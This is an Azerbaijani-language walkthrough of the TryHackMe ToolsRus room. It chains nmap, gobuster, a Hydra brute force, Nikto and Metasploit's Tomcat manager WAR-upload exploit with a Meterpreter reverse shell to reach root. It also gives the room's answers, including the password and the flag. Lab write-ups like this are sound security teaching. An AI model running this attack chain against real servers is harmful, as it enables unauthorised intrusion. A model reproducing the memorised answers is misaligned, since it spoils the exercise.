# ToolsRus — TryHackMe Hesabatı
 
## Ümumi Baxış
 
**ToolsRus**, TryHackMe-nin giriş səviyyəli, alət yönümlü otağıdır. Bu otaq, bir pentest-in ilk mərhələlərində ən çox istifadə olunan əsas alətləri (Nmap, Gobuster, Hydra, Nikto və Metasploit) ardıcıl şəkildə tətbiq etməyi öyrədir.
 
Otağın məqsədi — hədəf server-i **enumerate** etmək (tanımaq, öyrənmək), işləyən xidmətləri müəyyənləşdirmək, faydalı məlumatları tapmaq və nəticədə **tam giriş (root shell)** əldə etməkdir.
 
| | |
|---|---|
| **Otağın adı** | ToolsRus |
| **Səviyyə** | Giriş (Beginner) |
| **İstifadə olunan alətlər** | Nmap, Gobuster, Hydra, Nikto, Metasploit |
| **Zəiflik** | Apache Tomcat Manager Application — Authenticated Code Execution |
| **Nəticə** | Root səviyyəli sistem girişi |
 
---
 
## 1. İlkin Nmap Skanı
 
İlk addım hədəfdə açıq portları, işləyən xidmətləri və onların versiyalarını müəyyənləşdirmək idi.
 
**İstifadə olunan əmr:**
```bash
nmap -sC -sV 10.x.x.x -oN nmap_scan.txt
```
 
- `-sC` — Nmap-ın standart script-lərini işə salır
- `-sV` — hər açıq portda xidmətin **versiyasını** aşkarlamağa çalışır
- `-oN nmap_scan.txt` — nəticəni fayla yazır (sonradan hesabata daxil etmək üçün)
**Tapılan 4 açıq TCP port:**
 
| Port | Xidmət | Versiya |
|---|---|---|
| 22/tcp | SSH | OpenSSH 7.2p2 (Ubuntu) |
| 80/tcp | HTTP | Apache httpd 2.4.18 |
| 1234/tcp | HTTP | Apache Tomcat/Coyote JSP engine 1.1 |
| 8009/tcp | AJP13 | Apache Jserv Protocol 1.3 |
 
**Təhlil:** SSH (22-ci port) giriş məlumatı olmadan dərhal faydalı deyildi. Port 80 standart Apache veb server göstərirdi, amma **port 1234-də Apache Tomcat** aşkarlanması xüsusilə maraqlı idi — çünki Tomcat çox vaxt zəif və ya standart giriş məlumatları ilə qorunan idarəetmə interfeysinə malikdir. Port 8009 (AJP) də əlavə hücum səthi kimi qeyd edildi.
 
---
 
## 2. Port 80-dəki Veb Server-in Yoxlanması
 
Brauzerdə hədəf IP-yə daxil olanda, **ToysRUs mövzulu** bir səhifə göründü — mesaj bildirirdi ki, "ToolsRUs yenilənmə səbəbindən dayandırılıb, amma saytın digər hissələri işləkdir".
 
Bu, əsas səhifənin funksional olmadığını, amma **gizli qovluqların/səhifələrin** mövcud ola biləcəyini göstərirdi. Növbəti məntiqi addım — veb tətbiqi daha dərindən **enumerate** etmək idi.
 
---
 
## 3. Gobuster ilə Qovluq Kəşfiyyatı
 
**İstifadə olunan əmr:**
```bash
gobuster dir -u http://10.x.x.x -w /usr/share/wordlists/dirb/common.txt
```
 
Gobuster `common.txt` wordlist-i ilə **directory enumeration** rejimində işlədildi ki, əsas səhifədən keçid verilməyən qovluq/faylları tapsın.
 
**Tapılan maraqlı yollar:**
 
| Yol | Status | Məna |
|---|---|---|
| `/guidelines` | 301 (Redirect) | Qovluq mövcuddur |
| `/protected` | 401 (Unauthorized) | Qovluq mövcuddur, autentifikasiya tələb edir |
| `/server-status` | 403 | Mövcuddur, girişi qadağandır |
 
> **Sual:** "g" hərfi ilə başlayan hansı qovluğu tapa bilərsiniz?
> **Cavab:** `guidelines`
 
---
 
## 4. `/guidelines` Qovluğunun Araşdırılması
 
Bu qovluğa daxil olanda, qısa bir mesaj göründü:
 
> *"Hey bob, did you update that TomCat server?"*
 
Bu, iki vacib məlumat verdi:
1. **İstifadəçi adı ipucu:** `bob`
2. **Tomcat server-inin əhəmiyyəti** təsdiqləndi — Nmap skanında tapılan Tomcat xidməti növbəti mərhələ üçün önəmli olacaqdı
> **Sual:** Bu qovluqdan hansı adı tapa bilərsiniz?
> **Cavab:** `bob`
 
---
 
## 5. `/protected` Qovluğunun Müəyyənləşdirilməsi
 
Gobuster nəticəsində `/protected` 401 Unauthorized statusu qaytarmışdı. Brauzerdə bu yola daxil olanda, **HTTP Basic Authentication** login pəncərəsi göründü (istifadəçi adı + parol tələb edir).
 
Bu, qovluğun mövcud olduğunu, amma girişin **etibarlı giriş məlumatları** tələb etdiyini təsdiqlədi. `/guidelines`-dan tapılan `bob` adı, bu autentifikasiyada istifadə oluna bilərdi.
 
> **Sual:** Hansı qovluq basic authentication ilə qorunur?
> **Cavab:** `protected`
 
---
 
## 6. Hydra ilə Parolun Brute-Force Edilməsi
 
**İstifadə olunan əmr:**
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.x.x.x http-get /protected
```
 
- `-l bob` — sabit istifadəçi adı (`bob`)
- `-P rockyou.txt` — parol siyahısı (məşhur wordlist)
- `http-get /protected` — hədəf HTTP Basic Auth modulunda, `/protected` yoluna qarşı işlədilir
**Nəticə — parol tapıldı:**
 
| Sahə | Dəyər |
|---|---|
| İstifadəçi adı | `bob` |
| Parol | `bubbles` |
 
> **Sual:** Bob-un `/protected` hissəyə parolu nədir?
> **Cavab:** `bubbles`
 
---
 
## 7. Digər Veb Xidmətin (Tomcat) Təsdiqlənməsi
 
Nmap nəticələrinə qayıdanda, port 1234-də ikinci bir HTTP xidmətinin işlədiyi aydın oldu:
 
```
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
_http-title: Apache Tomcat/7.0.88
```
 
Bu, hədəfin **qeyri-standart portda Apache Tomcat** işlətdiyini təsdiqlədi.
 
> **Sual:** Veb xidmət göstərən başqa hansı port açıqdır?
> **Cavab:** `1234`
 
> **Sual:** Sual 5-dəki portda hansı proqram və versiya işləyir?
> **Cavab:** `Apache Tomcat/7.0.88`
 
> **Sual:** Bu xidmət hansı Apache-Coyote versiyasını istifadə edir?
> **Cavab:** `1.1`
 
---
 
## 8. Nikto ilə Tomcat Manager-in Skan Edilməsi
 
Tapılan giriş məlumatları (`bob:bubbles`) ilə, Nikto istifadə edərək Tomcat-ın `/manager/html` idarəetmə interfeysi skan edildi.
 
**İstifadə olunan əmr:**
```bash
nikto -h http://10.x.x.x:1234/manager/html -id bob:bubbles
```
 
Nikto **Tomcat Manager Application**-a uğurla autentifikasiya oldu və bir neçə vacib tapıntı üzə çıxardı:
 
- **Risqli HTTP metodları aktiv:** `PUT` (fayl yazmaq) və `DELETE` (fayl silmək) icazə verilirdi
- Tomcat-a aid sənədləşdirmə/məlumat yolları: `/manager/html/localstart.asp`, `/manager/html/manager/manager-howto.html`, `/manager/html/WorkArea/version.xml`
Otaq bu tapıntıları **5 sənəd/məlumat tipli** tapıntı kimi sayır.
 
> **Sual:** Neçə sənəd tapıldı?
> **Cavab:** `5`
 
---
 
## 9. Apache Server Versiyasının Təsdiqlənməsi (Port 80)
 
**İstifadə olunan əmr:**
```bash
nmap -sV -A 10.x.x.x
```
 
Nəticə, port 80-də **Apache httpd 2.4.18** (Ubuntu) işlədiyini göstərdi.
 
> **Sual:** Server versiyası nədir?
> **Cavab:** `Apache/2.4.18`
 
---
 
## 10. Metasploit ilə Tomcat Exploit-in Tapılması
 
Tomcat-ın işlədiyi (port 1234) və etibarlı giriş məlumatlarının mövcud olduğu təsdiqləndikdən sonra, Metasploit-də uyğun modul axtarıldı.
 
**İstifadə olunan əmrlər:**
```bash
sudo msfconsole
search tomcat
```
 
Nəticələr arasında ən uyğun modul seçildi:
 
```
exploit/multi/http/tomcat_mgr_upload
```
 
Bu modul, **etibarlı manager giriş məlumatları** olduğu halda, Apache Tomcat Manager tətbiqinə zərərli bir **WAR faylı** yükləyərək **kod icrası** əldə edir.
 
---
 
## 11. Tomcat Manager Upload Modulunun Konfiqurasiyası
 
Modul seçildikdən sonra, tələb olunan parametrlər təyin edildi:
 
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.x.x.x
set RPORT 1234
set HttpUsername bob
set HttpPassword bubbles
set TARGETURI /manager
```
 
| Parametr | Dəyər | Məqsəd |
|---|---|---|
| `RHOSTS` | Hədəf IP | Hədəf maşının ünvanı |
| `RPORT` | 1234 | Tomcat-ın işlədiyi port (standart 80-dən dəyişdirildi) |
| `HttpUsername` | bob | Tapılan istifadəçi adı |
| `HttpPassword` | bubbles | Tapılan parol |
| `TARGETURI` | /manager | Tomcat Manager yolu |
| `LHOST` | Hücum edən maşının IP-si | Reverse bağlantı üçün |
 
Metasploit avtomatik olaraq `java/meterpreter/reverse_tcp` payload-ını seçdi.
 
---
 
## 12. Exploit-in İcrası və Root Girişi
 
```bash
exploit
```
 
**Nəticə:**
```
[*] Started reverse TCP handler
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying [random].war...
[*] Executing [random].war...
[*] Meterpreter session 1 opened
```
 
Metasploit tapılan giriş məlumatlarını istifadə edərək autentifikasiya oldu, zərərli WAR faylını yüklədi və icra etdi. Nəticədə **Meterpreter sessiyası** uğurla açıldı.
 
Sistem shell-inə keçib istifadəçini yoxladıq:
 
```bash
meterpreter > shell
whoami
```
 
**Nəticə:** `root`
 
> **Sual:** Hansı istifadəçi kimi shell əldə etdiniz?
> **Cavab:** `root`
 
---
 
## 13. Flag-ın Oxunması
 
```bash
ls
cd /root
ls
cat flag.txt
```
 
`/root` qovluğunda `flag.txt` faylı tapıldı və oxundu.
 
> **Sual:** `/root` qovluğunda hansı flag var?
> **Cavab:** `ff1fc4a81affcc7688cf89ae7dc6e0e1`
 
---
 
## Nəticə
 
ToolsRus, hər tapıntının növbəti addımı **məntiqi şəkildə** açdığı, sadə amma effektiv bir öyrənmə otağı idi:
 
1. **Nmap** — açıq portları (80, 1234) və xidmətləri (Apache, Tomcat) aşkarladı
2. **Gobuster** — gizli qovluqları (`/guidelines`, `/protected`) tapdı
3. **`/guidelines`** — istifadəçi adını (`bob`) ifşa etdi
4. **Hydra** — parolu (`bubbles`) brute-force ilə tapdı
5. **Nikto** — Tomcat Manager interfeysini bu giriş məlumatları ilə təsdiqlədi
6. **Metasploit** (`tomcat_mgr_upload`) — tapılan giriş məlumatlarından istifadə edərək WAR faylı yüklədi və **birbaşa root səviyyəli shell** əldə etdi
Bu otaq, alətlərin **ardıcıl, əlaqəli** istifadəsinin real pentest metodologiyasında nə qədər vacib olduğunu göstərir — hər addımın nəticəsi növbəti addımın girişinə çevrilir.
 
---
 
## İstinadlar
 
- [ToolsRus — TryHackMe](https://tryhackme.com/room/toolsrus)
---
 
> Bu hesabat, yalnız təhsil məqsədilə TryHackMe üzərində əl işi laboratoriya tapşırığının bir hissəsi olaraq hazırlanmışdır. Bütün testlər icazə verilmiş, izolə edilmiş laboratoriya mühitində aparılmışdır.
 
